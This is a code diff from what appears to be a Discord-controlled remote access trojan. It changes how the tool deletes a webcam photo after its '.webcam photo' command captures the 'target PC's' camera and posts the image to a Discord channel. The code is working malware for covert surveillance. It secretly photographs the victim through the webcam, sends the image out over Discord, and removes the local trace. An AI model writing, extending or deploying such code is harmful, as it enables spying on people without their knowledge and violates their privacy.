@@ -37,7 +37,7 @@ elif message.content[:7] == '.webcam':
                 file=discord.File(f'C:\\Users\\{getuser()}\\{software_directory_name}\\webcam.png'))
             await reaction_msg.add_reaction('📌')
 
-            subprocess.run('del webcam.png', shell=True)
+            subprocess.run(f'del C:\\Users\\{getuser()}\\{software_directory_name}\\webcam.png', shell=True)
 
         else:
             reaction_msg = await message.channel.send('```Syntax: .webcam <action>\nActions:\n    photo - take a photo with target PC\'s webcam```')
